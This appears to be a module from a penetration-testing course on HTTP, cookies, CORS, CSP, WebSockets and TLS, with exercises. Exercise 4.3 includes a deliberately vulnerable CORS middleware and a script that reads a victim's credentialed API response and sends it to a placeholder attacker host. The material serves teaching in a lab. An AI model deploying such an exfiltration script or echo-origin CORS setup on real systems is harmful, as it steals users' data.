---
title: "HTTP, HTTPS and TLS in depth"
area: "Networking"
order: 4
level: "intermediate"
summary: "HTTP/1.1, HTTP/2, HTTP/3, semantics, cookies, CORS, CSP, HSTS, WebSockets. TLS handshake, ciphersuites, X.509 certificates, PKI, historical attacks (POODLE, BEAST, FREAK, Heartbleed)."
prereq:
  - "Section 03"
tools:
  - "curl, httpie"
  - "Burp Suite Community / mitmproxy"
  - "openssl"
  - "Wireshark"
---

# HTTP, HTTPS and TLS in depth

> 70% of the vulnerabilities you'll find in pentests are web-related. Knowing HTTP at the RFC level (and not just "I use fetch in JS") is one of the differences between a junior and a senior.

## HTTP — the protocol

HTTP is a textual request/response protocol. A request:

```http
GET /api/users?id=42 HTTP/1.1
Host: example.com
User-Agent: curl/8.0
Accept: application/json
Cookie: session=abc123
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...

(body if POST/PUT/PATCH)
```

A response:

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 27
Set-Cookie: session=xyz; HttpOnly; Secure; SameSite=Lax
Cache-Control: no-store

{"id":42,"name":"Alice"}
```

### Methods
- **GET**: read, idempotent, no body by convention.
- **HEAD**: like GET but headers only (useful for checks).
- **POST**: create resources, generic "do something".
- **PUT**: replace a resource.
- **PATCH**: partial modification.
- **DELETE**: delete.
- **OPTIONS**: what I support (used in CORS preflight).
- **CONNECT**: tunnel through a proxy.
- **TRACE**: echoes the request back (XST risk, usually disabled).

In security, GET and POST are the most exploited. PUT/DELETE enabled without auth = serious (yes, it happens).

### Status codes
- **1xx informational** (rare).
- **2xx success**: 200 OK, 201 Created, 204 No Content.
- **3xx redirect**: 301 permanent, 302 found, 303 see other, 307/308 (preserve method).
- **4xx client error**: 400, 401 (auth), 403 (forbidden), 404, 405, 409, 422, 429 (rate limit).
- **5xx server error**: 500, 502 (bad gateway), 503 (unavailable), 504 (timeout).

For testing: the difference between 401 and 403 matters; 401 = "you are not authenticated", 403 = "you are authenticated but not authorized". Often confused.

### Headers important for security

| Header (request) | What it does |
|---|---|
| `Host` | virtual host target |
| `User-Agent` | client identifier (spoofable) |
| `Cookie` | session |
| `Authorization` | credentials (Basic, Bearer, Digest) |
| `Origin` | request origin (CORS) |
| `Referer` | origin URL (often used as weak "anti-CSRF") |
| `Content-Type` | body type |
| `X-Forwarded-For` | original IP (if behind a proxy; spoofable if not sanitized) |
| `Accept-Language` | useful for blind injection/timing in some cases |
| `Range` | partial content (historically a Heartbleed-style attack vector) |

| Header (response) | What it does |
|---|---|
| `Set-Cookie` | sets a cookie |
| `Cache-Control`, `Pragma`, `Expires` | caching |
| `Content-Security-Policy` (CSP) | restricts script/style/etc. origins |
| `Strict-Transport-Security` (HSTS) | forces future HTTPS |
| `X-Frame-Options` / `Content-Security-Policy: frame-ancestors` | anti-clickjacking |
| `X-Content-Type-Options: nosniff` | prevents MIME sniffing |
| `Referrer-Policy` | controls the `Referer` sent |
| `Permissions-Policy` | controls browser APIs (camera, mic, ...) |
| `Cross-Origin-Resource-Policy` (CORP), `Cross-Origin-Opener-Policy` (COOP), `Cross-Origin-Embedder-Policy` (COEP) | process isolation (Spectre) |

Mnemonic for pentest "Security Headers": CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy. Always check.

## Cookies — the pitfalls you need to know

A cookie can have attributes:

```http
Set-Cookie: session=abc; Domain=example.com; Path=/; Expires=...; Max-Age=3600;
           HttpOnly; Secure; SameSite=Lax
```

- **HttpOnly**: the cookie is not accessible from JS (mitigates cookie-stealing XSS).
- **Secure**: send it only over HTTPS.
- **SameSite**:
  - `Strict`: never sent on cross-site requests → CSRF very hard.
  - `Lax` (modern default): sent on cross-site navigation (clicked link) but not on cross-site POST / fetch.
  - `None`: always sent (requires `Secure`).
- **Domain/Path**: scope. Without `Domain` = exact host only. With `Domain=example.com` it also applies to `sub.example.com`.
- **Prefix `__Host-`**: forces Secure, no Domain, Path=/ → host-locked cookie.
- **Prefix `__Secure-`**: forces Secure.

Without HttpOnly+Secure+SameSite the session is gifted via XSS / CSRF / MITM on residual HTTP connections.

## CORS — Same-Origin Policy and cross-origin

**Same-Origin Policy** (SOP): a browser does not allow JS on `https://a.com` to read responses from `https://b.com`. It's the foundation of web security.

Two origins are **same-origin** if they have the same **scheme + host + port**. `https://a.com` ≠ `http://a.com` ≠ `https://a.com:8080`.

**CORS** is the mechanism for *relaxing* SOP in a controlled way. The server includes headers:

```http
Access-Control-Allow-Origin: https://trusted.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: Content-Type, Authorization
```

**Preflight**: for "non-simple" requests (e.g. PUT method, JSON content-type with `application/json`, custom headers), the browser first sends `OPTIONS` to ask for permission.

```mermaid
sequenceDiagram
    autonumber
    participant JS as JS on https://a.com
    participant BR as Browser
    participant SRV as https://api.b.com
    JS->>BR: fetch('https://api.b.com/x', { method:'PUT' })
    BR->>SRV: OPTIONS /x<br/>Origin: https://a.com<br/>Access-Control-Request-Method: PUT
    SRV->>BR: 204<br/>Access-Control-Allow-Origin: https://a.com<br/>Access-Control-Allow-Methods: PUT
    BR->>SRV: PUT /x (actual)
    SRV->>BR: 200 + body
    BR->>JS: response
    Note over BR: If preflight denies → JS never sees<br/>the response (CORS error)
```

**Typical misconfigurations** (pentester's favorite):
- `Access-Control-Allow-Origin: *` with `Allow-Credentials: true` → invalid per spec, some browsers allow it anyway.
- Echo of `Origin` without validation → the attacker uses `Origin: https://attacker.com` and the server reflects it → game over.
- Subdomain takeover of `*.example.com` when CORS trusts subdomains → attacker controls `evil.example.com` → bypass.

## CSP — Content Security Policy

Defines which resources the page can load. Mitigation against XSS.

```http
Content-Security-Policy: default-src 'self'; 
   script-src 'self' https://cdn.example.com 'nonce-abc123'; 
   style-src 'self' 'unsafe-inline'; 
   img-src 'self' data:; 
   connect-src 'self'; 
   frame-ancestors 'none'; 
   base-uri 'self'; 
   object-src 'none'; 
   report-uri /csp-report
```

In pentest you often find:
- `unsafe-inline` and `unsafe-eval` (bypass most of CSP).
- Missing `nonce`/`hash`.
- Whitelists with permissive domains (`*.cloudflare.com`, JSONP endpoints).

## HTTP/2 and HTTP/3

- **HTTP/1.1**: textual, one request at a time per connection (pipelining almost never used in practice).
- **HTTP/2**: binary, multiplexing over a single TCP+TLS connection (parallel streams), header compression (HPACK), server push (rarely used).
- **HTTP/3**: HTTP over QUIC (UDP). No TCP head-of-line blocking, 0-RTT (with replay risks).

In security, HTTP/2 introduced new attacks: **HTTP/2 request smuggling**, downgrade attacks fronted by HTTP/1.1 CDNs, **HPACK bomb** (memory expansion).

### Request smuggling
When a frontend proxy and a backend interpret request boundaries differently (e.g. `Content-Length` vs `Transfer-Encoding: chunked`, or H2 frame → H1 request). The attacker "hides" a request inside another one → auth bypass, cache poisoning, account takeover. Reference: James Kettle's research (PortSwigger).

## WebSockets

Upgrade from HTTP to a bidirectional full-duplex connection.

```http
GET /ws HTTP/1.1
Host: example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
```

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

From here on, bidirectional binary/text frames. **Security issues:**
- **Cross-Site WebSocket Hijacking:** missing server-side `Origin` check → attacker opens a WS from their page using the victim's cookies.
- Missing rate limit / message-level auth.
- Typical vulnerabilities of the application protocol riding on top.

## TLS — the lifeline of HTTPS

TLS (Transport Layer Security) provides: **confidentiality** (encryption), **integrity** (MAC), **authenticity** (certificates). SSL is the legacy name (SSLv2/v3 dead, TLS 1.0/1.1 obsolete, TLS 1.2 and 1.3 current).

### TLS 1.2 handshake (simplified)

```mermaid
sequenceDiagram
    autonumber
    participant C as Client
    participant S as Server
    C->>S: ClientHello<br/>(version, cipher list, random, SNI)
    S->>C: ServerHello<br/>(chosen cipher, random)
    S->>C: Certificate (X.509 chain)
    S->>C: ServerKeyExchange (ECDHE parameters)
    S->>C: ServerHelloDone
    C->>S: ClientKeyExchange (ECDHE public key)
    C->>S: ChangeCipherSpec
    C->>S: Finished (encrypted)
    S->>C: ChangeCipherSpec
    S->>C: Finished (encrypted)
    Note over C,S: APPLICATION DATA encrypted (AES-GCM / ChaCha20-Poly1305)
```

From both sides, symmetric keys are derived from the randoms and the ECDHE shared secret. From here on, data is encrypted with AES-GCM (or ChaCha20-Poly1305).

### How you go from "shared secret" to "encryption keys" (the part usually not explained)

ECDHE produced a shared `pre_master_secret` (e.g. 32 bytes). From there:

```text
master_secret  = PRF(pre_master_secret, "master secret", client_random + server_random)
key_block      = PRF(master_secret, "key expansion", server_random + client_random)
```

`PRF` is a pseudo-random function (in TLS 1.2: HMAC-SHA256 in an extract-and-expand mode similar to HKDF). From `key_block`, 4 keys are sliced out:

- `client_write_MAC_key` (in CBC mode) / or nothing in GCM where auth is in the cipher.
- `server_write_MAC_key`.
- `client_write_key` (AES key for client→server).
- `server_write_key` (AES key for server→client).
- `client_write_IV` and `server_write_IV` (for modes that require them).

**Security implications:**
- Without `pre_master_secret` (and therefore without the server's private key / ephemeral ECDHE key), a sniffer gets nothing.
- **Forward secrecy**: with ECDHE, even if the server's RSA private key is stolen in the future, past sessions remain secure (the ephemeral keys were destroyed after the handshake).
- In TLS 1.2 with `RSA key exchange` (deprecated): the client encrypts `pre_master_secret` with the server's public key and sends it. **No forward secrecy** — anyone capturing traffic and later obtaining the server's private key can decrypt everything retroactively. This is the "broken" mode that TLS 1.3 removed.

### Key difference: TLS 1.2 vs TLS 1.3 (in 6 points)

| Aspect | TLS 1.2 | TLS 1.3 |
|---|---|---|
| Round trip | 2-RTT | 1-RTT (0-RTT with PSK) |
| Key exchange | RSA, DHE, ECDHE | only (EC)DHE (forward secrecy mandatory) |
| Cipher suite name | `TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256` (KEX+auth+cipher+PRF) | `TLS_AES_128_GCM_SHA256` (cipher+hash only; KEX/auth in extension) |
| MAC | HMAC (in CBC+HMAC) or GMAC (in GCM) | always AEAD (GCM/Poly1305) |
| Symmetric algorithms | many (incl. weak ones) | 5 AEAD-only |
| Compression | yes (vulnerable to CRIME) | removed |

### TLS 1.3 handshake (leaner)

- 1-RTT by default (was 2 in TLS 1.2).
- **Removed:** RSA key exchange (no forward secrecy), CBC ciphers, SHA-1, compression, renegotiation.
- **PSK + 0-RTT** optional (with limits to avoid replay).
- AEAD only: AES-GCM, AES-CCM, ChaCha20-Poly1305.

### Cipher suites

In TLS 1.2: `TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256`
- `ECDHE`: key exchange (forward secrecy).
- `RSA`: authentication (certificate signature).
- `AES_128_GCM`: authenticated symmetric cipher.
- `SHA256`: hash for PRF.

In TLS 1.3: `TLS_AES_128_GCM_SHA256` (auth and KEX negotiated separately).

**Ciphers to disable:** anything with `RC4`, `3DES`, `EXPORT`, `NULL`, `MD5`, `anon`, `CBC` (in TLS 1.2 in some contexts).

### X.509 certificates

A certificate binds a public key to an identity (host, organization) and is signed by a CA.

```bash
openssl s_client -connect example.com:443 -servername example.com -showcerts
openssl x509 -in cert.pem -text -noout
```

Fields:
- **Subject**: who it belongs to (CN, O, OU, C…).
- **Issuer**: who signed it (the CA).
- **Validity**: validity period.
- **Subject Public Key**: the public key.
- **Extensions**:
  - **Subject Alternative Names (SAN)**: list of hosts covered.
  - **Key Usage / Extended Key Usage**: what it can do (server auth, client auth, code signing).
  - **CRL Distribution Points / OCSP**: revocations.
  - **Authority Info Access**: where to fetch the CA certificate.
- **Signature** from the CA.

**Client-side validation:**
1. Hostname matches CN/SAN.
2. Full chain up to a trusted root CA (trust store).
3. Time validity.
4. Not revoked (CRL / OCSP / OCSP stapling).
5. Acceptable algorithms.

Errors that produce "certificate invalid":
- self-signed or incomplete chain → trust failure.
- CN/SAN mismatch.
- Expired.
- Deprecated algorithm (SHA-1 signature).
- Cert for an incorrect wildcard host.

### Enterprise PKI — internal CA

Companies often issue certificates from an **internal CA** for intranet services or TLS interception (enterprise proxy). The internal CA's certificate is installed in the trust stores of company laptops → it allows the proxy to decrypt TLS in transit.

In offensive work: during an internal pentest, importing the Burp/mitmproxy CA into the browser lets you see HTTPS traffic without errors.

### Historical attacks (memorize names and ideas)

| Year | Attack | What it targets | Idea |
|---|---|---|---|
| 2009 | **Renegotiation** | TLS 1.0/1.1 | Inject data before renegotiation |
| 2011 | **BEAST** | TLS 1.0 CBC | IV predictability |
| 2012 | **CRIME** | TLS compression | Leak cookie via compress |
| 2013 | **BREACH** | HTTP compression | Like CRIME but over HTTP |
| 2014 | **Heartbleed** | OpenSSL heartbeat extension | OOB read → key leak |
| 2014 | **POODLE** | SSLv3 padding oracle | Decrypt byte-by-byte |
| 2015 | **FREAK** | Export-grade RSA | Downgrade |
| 2015 | **Logjam** | Weak DH primes | DH downgrade |
| 2016 | **DROWN** | SSLv2 cross-protocol | Decrypt TLS via old SSLv2 |
| 2016 | **Sweet32** | 64-bit block ciphers | Compromise DES/3DES |
| 2018 | **ROBOT** | RSA key exchange | Historic Bleichenbacher padding oracle, still alive |

All of these are mitigated on up-to-date systems with TLS 1.2+/1.3 well configured.

**Test TLS config:** [ssllabs.com/ssltest](https://www.ssllabs.com/ssltest/), `testssl.sh`.

```bash
testssl.sh https://example.com
nmap --script ssl-enum-ciphers -p 443 example.com
```

## HSTS and Certificate Transparency

- **HSTS**: header `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`. Tells the browser "for a year, use HTTPS only, no downgrade". With `preload` you end up in the hardcoded lists of Chrome/Firefox → resistant to first-use attacks.
- **Certificate Transparency**: every public cert must be logged in public CT logs. Defensive tool: monitor cert issuance for your domains → spot rogue CAs. Tool: [crt.sh](https://crt.sh).

## Exercises

### Exercise 4.1 — Do you speak HTTP by hand?

```bash
exec 3<>/dev/tcp/example.com/80
printf 'GET / HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n' >&3
cat <&3
```

Run it. Analyze the response. Identify status, headers, any redirects.

### Exercise 4.2 — TLS analysis of a real site
Pick a site (e.g. `github.com`).

```bash
openssl s_client -connect github.com:443 -servername github.com -tls1_3 < /dev/null
nmap --script ssl-enum-ciphers,ssl-cert,ssl-known-key -p 443 github.com
testssl.sh --severity HIGH https://github.com
```

Answer:
1. Which CA signs the cert? Validity?
2. How many SANs are included?
3. Which TLS 1.3 cipher suites does it support?
4. HSTS? What max-age?
5. Is there an SSL Labs A+ grade? What would lower it?

### Exercise 4.3 — CORS misconfig
In a lab: set up a small Express server that returns `Access-Control-Allow-Origin: <Origin echo>` and `Allow-Credentials: true`. Write a page on another origin that fetches the API and demonstrate the leak.

<details><summary>Vulnerable server snippet</summary>

```js
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin); // ECHO
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  next();
});
```

```html
<script>
fetch('https://victim.example/api/me', { credentials: 'include' })
  .then(r => r.text()).then(t => fetch('https://attacker/log?d=' + encodeURIComponent(t)));
</script>
```

Mitigation: static origin whitelist, no echo.

</details>

### Exercise 4.4 — Cookie hardening
Analyze the cookies of your favorite site (DevTools → Application → Cookies). For each one: HttpOnly? Secure? SameSite?

What are the risks if they're missing? Which cookie categories can *not* have HttpOnly (e.g. anti-CSRF token readable by JS)?

### Exercise 4.5 — HTTP Request Smuggling (conceptual)
Read James Kettle's classic paper ["HTTP Desync Attacks: Request Smuggling Reborn"](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn). Explain the difference between CL.TE and TE.CL in 5 sentences.

### Exercise 4.6 — PortSwigger Lab
Go to the [PortSwigger Web Security Academy](https://portswigger.net/web-security). Complete the free module "**CORS**" (4 labs) and "**HTTP Host header attacks**" (7 labs). They're guided and FREE.

### Exercise 4.7 — Extension: HSTS bypass
Explain why HSTS protects less the users who visit a domain for the first time (TOFU — Trust On First Use). What does the preload list fix?

### Exercise 4.8 — Conceptual WebSocket hijacking
Sketch the scenario: a victim logged into `chat.example.com`, an attacker hosts a page that opens `WebSocket('wss://chat.example.com/...')`. What is needed server-side to prevent this?

<details><summary>Answer</summary>

Validate the `Origin` header server-side at the time of the WS upgrade (or use a CSRF token in the sub-protocol).

</details>

## Key concepts

1. **HTTP is textual, easy to read and therefore easy to abuse.**
2. **Cookies with the right attributes (HttpOnly, Secure, SameSite) eliminate many categories of attack.**
3. **CORS isn't "a defense" but a *controlled relaxation* of SOP; misconfig = exfil.**
4. **CSP is the first line against XSS — but `unsafe-inline` breaks it.**
5. **HTTP/2/3 and mixed gateways open new attack surfaces (smuggling).**
6. **TLS protects from man-in-the-middle without keys; whoever holds the endpoint or trust store has everything.**
7. **HSTS + CT log + internal PKI: an ecosystem, not a single header.**

Now we're ready for "real" cryptography.
